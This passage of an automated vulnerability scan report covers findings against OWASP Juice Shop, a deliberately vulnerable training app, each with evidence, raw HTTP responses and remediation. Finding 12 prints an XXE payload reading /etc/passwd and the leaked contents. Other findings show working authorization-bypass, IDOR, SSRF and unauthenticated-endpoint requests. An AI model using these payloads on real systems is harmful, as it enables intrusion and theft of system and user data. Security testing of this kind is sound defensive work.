musc13","author":"uvogin@juice-sh.op","product":2,"likesCount":0,"likedBy":[],"_id":"ubogxLtjnzq5p2B9P"},{"message":"The DSOMM Live Assessment session will even use Juice Shop as its \"real-world\" example!","author":"wurstbrot@juice-sh.op","product":46,"likesCount":0,"likedBy":[],"_id":"vS2XrQ4HC9EBLYWEY"},{"message":"Puny mask for puny human weaklings!","author":"bender@juice-sh.op","product":38,"likesCount":0,"likedBy":[],"_id":"wEnG4FdT6rYYxKQbs"},{"message":"I'd stand on my head to make you a deal for this piece of art.","author":"stan@juice-sh.op","product":42,"likesCount":0,"likedBy":[],"_id":"yLiQfCth8JYR5iS8m"}],"updated":[{"message":"sechive validation marker","author":"bender@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"6Xct8Ysa9gFGqC84e"},{"message":"sechive validation marker","author":"mc.safesearch@juice-sh.op","product":41,"likesCount":0,"likedBy":[],"_id":"7gKo7H6m7bBaxXtD6"},{"message":"sechive validation marker","author":"bender@juice-sh.op","product":39,"likesCount":0,"likedBy":[],"_id":"9w2B2pj7PQ2gwMZbt"},{"message":"sechive validation marker","author":"jim@juice-sh.op","product":20,"likesCount":0,"likedBy":[],"_id":"LKkdXBpmAmd8E2bcn"},{"message":"sechive validation marker","author":"mc.safesearch@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"LbH5LqyKrDQgXT9KK"},{"message":"sechive validation marker","author":"jim@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"ZicHDkZZcKwJAshyp"},{"message":"sechive validation marker","author":"morty@juice-sh.op","product":32,"likesCount":0,"likedBy":[],"_id":"axSrNrfnaJTaA5kn4"},{"message":"sechive validation marker","author":"bjoern@owasp.org","product":35,"likesCount":0,"likedBy":[],"_id":"c3Ch4tWWCcP3skrdh"},{"message":"sechive validation marker","author":"bender@juice-sh.op","product":42,"likesCount":0,"likedBy":[],"_id":"cHRpCDK4cF7j6j9ie"},{"message":"sechive validation marker","author":"bender@juice-sh.op","product":6,"likesCo
```

### 12. XXE file disclosure signal: POST /file-upload
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, server-local-read, persistence-adjacent
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required; single local-read proof request; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: XML upload processing resolved external entities and exposed host file content markers.

**Proof Of Concept**
Upload XML containing external entity reference to a local file and inspect response.

**Evidence**
`POST http://[REDACTED_HOST]/file-upload` with XML entity payload returned filesystem markers.

**Remediation**
Disable external entity resolution and DTD processing for all XML parsers.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/file-upload
Status: 410
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close
Transfer-Encoding: chunked

Body Snippet:
<html>
  <head>
    <meta charset='utf-8'>
    <title>Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;root:x:0:0:root:/root:/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/sbin/nologinnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin&lt;/foo&gt; (sechive-xxe.xml)</title>
    <style>* {
  margin: 0;
  padding: 0;
  outline: 0;
}

body {
  padding: 80px 100px;
  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
  background-repeat: no-repeat;
  color: #555;
  -webkit-font-smoothing: antialiased;
}
h1, h2 {
  font-size: 22px;
  color: #343434;
}
h1 em, h2 em {
  padding: 0 5px;
  font-weight: normal;
}
h1 {
  font-size: 60px;
}
h2 {
  margin-top: 10px;
}
ul li {
  list-style: none;
}
#stacktrace {
  margin-left: 60px;
}
</style>
  </head>
  <body>
    <div id="wrapper">
      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
      <h2><em>410</em> Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;root:x:0:0:root:/root:/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/sbin/nologinnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin&lt;/foo&gt; (sechive-xxe.xml)</h2>
      <ul id="stacktrace"><li> &nbsp; &nbsp;at handleXmlUpload (/juice-shop/build/routes/fileUpload.js:119:22)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at handleZipFileUpload (/juice-shop/build/routes/fileUpload.js:88:9)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at checkFileType (/juice-shop/build/routes/fileUpload.js:104:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at checkUploadSize (/juice-shop/build/routes/fileUpload.js:96:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at /juice-shop/build/routes/metrics.js:84:9</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at ensureFileIsPassed (/juice-shop/build/routes/fileUpload.js:46:9)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at done (/juice-shop/node_modules/multer/lib/make-middleware.js:47:7)</li><li> &nbsp; &nbsp;at indicateDone (/juice-shop/node_modules/multer/lib/make-middleware.js:51:68)</li><li> &nbsp; &nbsp;at Multipart.&lt;anonymous&gt; (/juice-shop/node_modules/multer/lib/make-middleware.js:168:7)</li><li> &nbsp; &nbsp;at Multipart.emit (node:events:508:28)</li></ul>
    </div>
  </body>
</html>
```

### 13. Regular user product creation authorization signal
- Severity: HIGH
- Status: validated
- Confidence: 0.85
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, rce-adjacent, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Product creation endpoint accepted a non-admin token, indicating missing role enforcement.

**Proof Of Concept**
Register/login as regular user and POST to product creation endpoint.

**Evidence**
`POST http://[REDACTED_HOST]/api/Products` returned success for a regular account.

**Remediation**
Restrict product-management endpoints to privileged roles with server-side policy checks.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/api/Products
Status: 201
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Location: /api/Products/47
Content-Type: application/json; charset=utf-8
Content-Length: 259
ETag: W/"103-3ZnBztfxQ4+d/EJoHdpk8IXZWK0"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:49 GMT
Connection: close

Request JSON:
{
  "name": "SecHive Test Product 1777860048738",
  "description": "authorization check",
  "price": 9.99,
  "image": "x.jpg"
}

Body Snippet:
{"status":"success","data":{"id":47,"name":"SecHive Test Product 1777860048738","description":"authorization check","price":9.99,"image":"x.jpg","updatedAt":"2026-05-04T02:00:48.977Z","createdAt":"2026-05-04T02:00:48.977Z","deluxePrice":null,"deletedAt":null}}
```

### 14. Cross-user basket item modification signal
- Severity: HIGH
- Status: validated
- Confidence: 0.84
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Authenticated basket-item update succeeded on a fixed object id, indicating possible write-level IDOR.

**Proof Of Concept**
PUT http://[REDACTED_HOST]/api/BasketItems/1 with a non-owner token and `{"quantity": 5}`.

**Evidence**
`PUT http://[REDACTED_HOST]/api/BasketItems/1` returned HTTP 200 with updated quantity.

**Remediation**
Authorize write operations against ownership/role policy before mutating basket items.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/api/BasketItems/1
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 154
ETag: W/"9a-cvuKD9Vp+pEffj5683vDzQiL/8g"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close

Request JSON:
{
  "quantity": 5
}

Body Snippet:
{"status":"success","data":{"ProductId":1,"BasketId":1,"id":1,"quantity":5,"createdAt":"2026-05-04T01:32:42.830Z","updatedAt":"2026-05-04T02:00:48.371Z"}}
```

### 15. Cross-user basket checkout signal
- Severity: HIGH
- Status: validated
- Confidence: 0.83
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, credential-exposure
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Checkout succeeded for a fixed basket id, suggesting missing ownership checks on order execution.

**Proof Of Concept**
POST http://[REDACTED_HOST]/rest/basket/2/checkout with a non-owner token.

**Evidence**
`POST http://[REDACTED_HOST]/rest/basket/2/checkout` returned order confirmation markers.

**Remediation**
Bind checkout operations to the authenticated principal’s basket only.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/basket/2/checkout
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 45
ETag: W/"2d-YB+K3kB29ZQ4S5i2TWFQ11k2jMk"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close

Request JSON:
{}

Body Snippet:
{"orderConfirmation":"5267-a42964f11e9021a6"}
```

### 16. SSRF internal fetch signal: /profile/image/url
- Severity: HIGH
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, persistence-adjacent, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: URL-ingestion endpoint accepted an internal application URL and returned internal-fetch response markers.

**Proof Of Concept**
POST http://[REDACTED_HOST]/profile/image/url with `imageUrl` pointing to `http://[REDACTED_HOST]/rest/admin/application-version`.

**Evidence**
`POST http://[REDACTED_HOST]/profile/image/url` with internal `imageUrl` returned application markers.

**Remediation**
Block private/link-local/internal destinations, enforce strict URL allowlists, and apply identical validation across HTTP methods.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/profile/image/url
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Security-Policy: img-src 'self' assets/public/images/uploads/defaultAdmin.png; script-src 'self' 'unsafe-eval'
Content-Type: text/html; charset=utf-8
Content-Length: 6152
ETag: W/"1808-UyyENhRDZzOid5c2k95vydI0A1k"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:49 GMT
Connection: close

Request JSON:
{
  "imageUrl": "http://[REDACTED_HOST]/rest/admin/application-version"
}

Body Snippet:
<!DOCTYPE html><html lang="en"><head><title>OWASP Juice Shop</title><meta charset="utf-8"><meta name="description" content=""><meta name="keywords" content=""><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="./assets/public/favicon_js.ico"><link rel="stylesheet" href="/vendor/material-design-lite/material.min.css"><link rel="stylesheet" href="/vendor/material-icons/material-icons.css"><link rel="stylesheet" href="./assets/public/css/userProfile.css" type="text/css"><link rel="stylesheet" href="./assets/public/css/roboto.css" type="text/css"><script src="/vendor/material-design-lite/material.min.js"></script><style>.mdl-textfield__input {
border-bottom: 1px solid #FFFFFF !important;
font-size: 13px !important;
}</style></head><body style="background: #303030;color:#FFFFFF;"><div class="mdl-layout mdl-js-layout mdl-layout--fixed-header"><header class="mdl-layout__header mdl-shadow--8dp" style="background: #546E7A; height: auto; min-width: 100%; padding-bottom: 5px; width: 100%;"><div class="mdl-layout__header-row"><a href="./#/" style="color: #FFFFFF; text-decoration:none; margin-left: -50px;"><i class="material-icons" style="display: block;margin-bottom: auto;margin-top: auto; margin-right: 10px;">arrow_back</i></a><a href="./#/" style="color: #FFFFFF; text-decoration:none;"><span style="margin-right: 20px;">Back</span></a><!-- Logo--><a href="./#/"><img src="assets/public/images/JuiceShop_Logo.png" style="max-height: 60px; width: auto;" alt="OWASP Juice Shop Logo"></a><!-- Title--><a href="./#/" style="color: #FFFFFF; text-decoration:none;"><span class="mdl-layout-title" style="font: 500 20px/32px Roboto,&quot;Helvetica Neue&quot;,sans-serif;">OWASP Juice Shop</span></a></div></header></div><main class="mdl-layout__content" style=" display: block; margin-left: auto; margin-right:auto;"><section class="section--center mdl-grid mdl-grid--no-spacing"><div class="mdl-card mdl-cell mdl-cell--12-col mdl-shadow--8dp" id="card" style="height: auto; min-width: 300px;  width: 40%; display: block; margin-left: auto; margin-right:auto; background: #424242; margin-bottom: 50px; margin-top: 110px;"><div class="mdl-card__supporting-text mdl-grid mdl-grid--no-spacing"><h1 class="mdl-cell mdl-cell--12-col" style="color: #FFFFFF; font-size: 24px; line-height: 32px; margin-top: 16px; margin-bottom: 16px; font-weight: 400;">User Profile</h1><div class="mdl-cell mdl-cell--6-col-desktop mdl-cell--12-col-tablet mdl-cell--12-col-phone"><img class="img-rounded" src="assets/public/images/uploads/defaultAdmin.png" alt="profile picture" width="90%" height="236" style="margin-right: 5%; margin-left: 5%;"><p style="margin-top:8%; color: #FFFFFF; text-align: center;">\</p><form action="./profile/image/file" style="margin-top:10%; width: 90%; margin-right: auto; margin-left: auto;" method="post" enctype="multipart/form-data"><div class="form-group"><label for="picture" style="color: #FFFFFF; font-size: 12px;">File Upload:</label><input id="picture" type="file" accept="image/*" name="file" size="150" style="color: #FFFFFF; margin-top: 4px;" aria-label="Input for selecting the profile picture"><div class="mdl-tooltip" for="picture" style="width: 150px; text-align: left;">&bull; Maximum file size 150Kb<br>&bull; All image formats are accepted</div></div><button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" type="submit" style="background-color:#546E7A; color: #FFFFFF; margin-top: 3%; text-transform: capitalize;" aria-label="Button to upload the profile picture">Upload Picture</button></form><div class="breakLine" style="margin-top: 3%; margin-bottom: 3%; width: 90%; margin-right: auto; margin-left: auto;"><div class="line"><div></div></div><div class="textOnLine" style="color: #FFFFFF;">or</div><div class="line"><div></div></div></div><form action="./profile/image/url" style="margin-top:5%; width: 90%; margin-right: auto; margin-left: auto;" method="post"><div class="form-group"><div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 100%;"><input class="form-control mdl-textfield__input" id="url" type="text" name="imageUrl" style="color: #FFFFFF;" placeholder="e.g. https://www.gravatar.com/avatar/[REDACTED_SECRET]" aria-label="Text field for the image link"><label class="mdl-textfield__label" for="url" style="color: #FFFFFF;">Image URL:</label></div></div><button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" id="submitUrl" type="submit" style="background-color:#546E7A; color: #FFFFFF; margin-top: -10px; text-transform: capitalize;" aria-label="Button to include image from link">Link Image</button><p style="margin-bottom:10%;"></p></form></div><div class="mdl-cell mdl-cell--6-col-desktop mdl-cell--12-col-tablet mdl-cell--12-col-phone"><form action="./profile" method="post" style="width: 90%; margin-right: auto; margin-left: auto;"><div class="form-group"><div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 100%; opacity: 0.7"><input class="form-control mdl-textfield__input" id="email" type="email" name="email" value="admin@juice-sh.op" disabled style="color: #FFFFFF;" aria-label="Disabled - Text field for the email"><label class="mdl-textfield__label" for="email" style="color: #FFFFFF;">Email:</label></div></div><div class="form-group"><div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 100%;"><input class="form-control mdl-textfield__input" id="username" type="text" name="username" value="" style="color: #FFFFFF;" placeholder="e.g. SuperUser" aria-label="Text field for the username"><label class="mdl-textfield__label" for="username" style="color: #FFFFFF;">Username:</label></div></div><button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" id="submit" type="submit" style="background-color:#546E7A; color: #FFFFFF; margin-top: -10px; text-transform: capitalize;" aria
```

### 17. Unauthenticated sensitive endpoint exposure: GET /rest/admin/application-configuration
- Severity: HIGH
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: Endpoint `/rest/admin/application-configuration` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://[REDACTED_HOST]/rest/admin/application-configuration without authentication

**Evidence**
http://[REDACTED_HOST]/rest/admin/application-configuration returned HTTP 200 unauthenticated.

**Remediation**
Require authentication and authorization checks for sensitive endpoints and files.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/admin/application-configuration
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 21774
ETag: W/"550e-KS1UudjtTaK4lCqQei8x28Q4yPg"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close

Body Snippet:
{"config":{"server":{"port":3000,"basePath":"","baseUrl":"http://localhost:3000"},"application":{"domain":"juice-sh.op","name":"OWASP Juice Shop","logo":"JuiceShop_Logo.png","favicon":"favicon_js.ico","theme":"bluegrey-lightgreen","showVersionNumber":true,"showGitHubLinks":true,"localBackupEnabled":true,"numberOfRandomFakeUsers":0,"altcoinName":"Juicycoin","privacyContactEmail":"donotreply@owasp-juice.shop","customMetricsPrefix":"juiceshop","chatBot":{"name":"Juicy","greeting":"Nice to meet you <customer-name>, I'm <bot-name>","trainingData":"botDefaultTrainingData.json","defaultResponse":"Sorry I couldn't understand what you were trying to say","avatar":"JuicyChatBot.png"},"social":{"blueSkyUrl":"https://bsky.app/profile/owasp-juice.shop","mastodonUrl":"https://fosstodon.org/@owasp_juiceshop","twitterUrl":"https://twitter.com/owasp_juiceshop","facebookUrl":"https://www.facebook.com/owasp.juiceshop","slackUrl":"https://owasp.org/slack/invite","redditUrl":"https://www.reddit.com/r/owasp_juiceshop","pressKitUrl":"https://github.com/OWASP/owasp-swag/tree/master/projects/juice-shop","nftUrl":"https://opensea.io/collection/juice-shop","questionnaireUrl":null},"recyclePage":{"topProductImage":"fruit_press.jpg","bottomProductImage":"apple_pressings.jpg"},"welcomeBanner":{"showOnFirstStart":true,"title":"Welcome to OWASP Juice Shop!","message":"<p>Being a web application with a vast number of intended security vulnerabilities, the <strong>OWASP Juice Shop</strong> is supposed to be the opposite of a best practice or template application for web developers: It is an awareness, training, demonstration and exercise tool for security risks in modern web applications. The <strong>OWASP Juice Shop</strong> is an open-source project hosted by the non-profit <a href='https://owasp.org' target='_blank'>Open Worldwide Application Security Project (OWASP)</a> and is developed and maintained by volunteers. Check out the link below for more information and documentation on the project.</p><h1><a href='https://owasp-juice.shop' target='_blank'>https://owasp-juice.shop</a></h1>"},"cookieConsent":{"message":"This website uses fruit cookies to ensure you get the juiciest tracking experience.","dismissText":"Me want it!","linkText":"But me wait!","linkUrl":"https://www.youtube.com/watch?v=9PnbKL3wuH4"},"securityTxt":{"contact":"mailto:donotreply@owasp-juice.shop","encryption":"https://keybase.io/bkimminich/pgp_keys.asc?fingerprint=[REDACTED_SECRET]","acknowledgements":"/#/score-board","hiring":"/#/jobs","csaf":"/.well-known/csaf/provider-metadata.json"},"promotion":{"video":"owasp_promo.mp4","subtitles":"owasp_promo.vtt"},"easterEggPlanet":{"name":"Orangeuze","overlayMap":"orangemap2k.jpg"},"googleOauth":{"clientId":"1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com","authorizedRedirects":[{"uri":"https://demo.owasp-juice.shop"},{"uri":"https://juice-shop.herokuapp.com"},{"uri":"https://preview.owasp-juice.shop"},{"uri":"https://juice-shop-staging.herokuapp.com"},{"uri":"https://juice-shop.wtf"},{"uri":"http://localhost:3000","proxy":"https://local3000.owasp-juice.shop"},{"uri":"http://127.0.0.1:3000","proxy":"https://local3000.owasp-juice.shop"},{"uri":"http://localhost:4200","proxy":"https://local4200.owasp-juice.shop"},{"uri":"http://127.0.0.1:4200","proxy":"https://local4200.owasp-juice.shop"},{"uri":"http://[REDACTED_HOST]","proxy":"https://localmac.owasp-juice.shop"},{"uri":"http://[REDACTED_HOST]","proxy":"https://localmac.owasp-juice.shop"},{"uri":"http://penguin.termina.linux.test:3000","proxy":"https://localchromeos.owasp-juice.shop"},{"uri":"http://penguin.termina.linux.test:4200","proxy":"https://localchromeos.owasp-juice.shop"}]}},"challenges":{"showSolvedNotifications":true,"showHints":true,"showMitigations":true,"codingChallengesEnabled":"solved","restrictToTutorialsFirst":false,"overwriteUrlForProductTamperingChallenge":"https://owasp.slack.com","xssBonusPayload":"<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"></iframe>","safetyMode":"disabled","csafHashValue":"[REDACTED_SECRET]","metricsIgnoredUserAgents":["Prometheus","Alloy","promscrape","otelcol"]},"hackingInstructor":{"isEnabled":true,"avatarImage":"JuicyBot.png","hintPlaybackSpeed":"normal"},"products":[{"name":"Apple Juice (1000ml)","price":1.99,"deluxePrice":0.99,"limitPerUser":5,"description":"The all-time classic.","image":"apple_juice.jpg","reviews":[{"text":"One of my favorites!","author":"admin"}]},{"name":"Orange Juice (1000ml)","description":"Made from oranges hand-picked by Uncle Dittmeyer.","price":2.99,"deluxePrice":2.49,"image":"orange_juice.jpg","reviews":[{"text":"y0ur f1r3wall needs m0r3 musc13","author":"uvogin"}]},{"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"image":"eggfruit_juice.jpg","reviews":[{"text":"I bought it, would buy again. 5/7","author":"admin"}]},{"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"image":"raspberry_juice.jpg"},{"name":"Lemon Juice (500ml)","description":"Sour but full of vitamins.","price":2.99,"deluxePrice":1.99,"limitPerUser":5,"image":"lemon_juice.jpg"},{"name":"Banana Juice (1000ml)","description":"Monkeys love it the most.","price":1.99,"image":"banana_juice.jpg","reviews":[{"text":"Fry liked it too.","author":"bender"}]},{"name":"OWASP Juice Shop T-Shirt","description":"Real fans wear it 24/7!","price":22.49,"limitPerUser":5,"image":"fan_shirt.jpg"},{"name":"OWASP Juice Shop CTF Girlie-Shirt","description":"For serious Capture-the-Flag heroines only!","price":2
```

### 18. Unauthenticated sensitive endpoint exposure: GET /rest/admin/application-version
- Severity: HIGH
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: Endpoint `/rest/admin/application-version` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://[REDACTED_HOST]/rest/admin/application-version without authentication

**Evidence**
http://[REDACTED_HOST]/rest/admin/application-version returned HTTP 200 unauthenticated.

**Remediation**
Require authentication and authorization checks for sensitive endpoints and files.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/admin/application-version
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 20
ETag: W/"14-tCKnqyl1elU2Vzkywa8P9qRtJx4"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close

Body Snippet:
{"version":"19.2.1"}
```

### 19. Unauthenticated sensitive endpoint exposure: GET /rest/memories
- Severity: HIGH
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Sensitive-looking endpoint `/rest/memories` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://[REDACTED_HOST]/rest/memories

**Evidence**
`GET http://[REDACTED_HOST]/rest/memories` returned HTTP 200.

**Remediation**
Require authentication and object-level authorization for sensitive API and file endpoints.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/memories
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 6183
ETag: W/"1827-RHYZUnVKwoZa/+DuQNBy9pvAZMU"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close

Body Snippet:
{"status":"success","data":[{"UserId":13,"id":1,"caption":"😼 #zatschi #whoneedsfourlegs","imagePath":"assets/public/images/uploads/ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg","createdAt":"2026-05-04T01:32:43.405Z","updatedAt":"2026-05-04T01:32:43.405Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"[REDACTED_SECRET]","role":"deluxe","deluxeToken":"[REDACTED_SECRET]","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-05-04T01:32:37.372Z","updatedAt":"2026-05-04T01:32:37.372Z","deletedAt":null}},{"UserId":4,"id":2,"caption":"Magn(et)ificent!","imagePath":"assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg","createdAt":"2026-05-04T01:32:43.406Z","updatedAt":"2026-05-04T01:32:43.406Z","User":{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","password":"[REDACTED_SECRET]","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-05-04T01:32:37.368Z","updatedAt":"2026-05-04T01:32:37.368Z","deletedAt":null}},{"UserId":4,"id":3,"caption":"My rare collectors item! [̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]","imagePath":"assets/public/images/uploads/my-rare-collectors-item!-[̲̅$̲̅(̲̅-͡°-͜ʖ-͡°̲̅)̲̅$̲̅]-1572603645543.jpg","createdAt":"2026-05-04T01:32:43.406Z","updatedAt":"2026-05-04T01:32:43.406Z","User":{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","password":"[REDACTED_SECRET]","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-05-04T01:32:37.368Z","updatedAt":"2026-05-04T01:32:37.368Z","deletedAt":null}},{"UserId":21,"id":4,"caption":"Welcome to the Bee Haven 